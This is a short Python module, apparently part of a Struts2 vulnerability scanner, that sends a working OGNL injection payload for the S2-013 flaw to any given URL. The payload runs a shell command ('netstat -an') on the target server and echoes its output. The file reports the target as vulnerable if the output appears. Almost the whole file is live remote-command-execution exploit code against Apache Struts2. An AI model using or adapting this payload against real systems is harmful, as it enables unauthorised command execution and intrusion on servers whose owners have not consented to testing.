import requests
# url随意
class struts2_013:
    def __init__(self, url):
        self.url = url

    def attack(self):
        print('test {} --> struts2_013'.format(self.url))
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        exp = '''a=1${(%23_memberAccess["allowStaticMethodAccess"]=true,%23a=@java.lang.Runtime@getRuntime().exec('netstat -an').getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[50000],%23c.read(%23d),%23sbtest=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23sbtest.println(%23d),%23sbtest.close())}'''
        try:
            resp = requests.post(self.url, data=exp, headers=headers, timeout=10)
            if "0.0.0.0" in resp.text:
                return "s2-013"
        except:
            #print('test --> struts2_013 Failed!')
            return None
        return None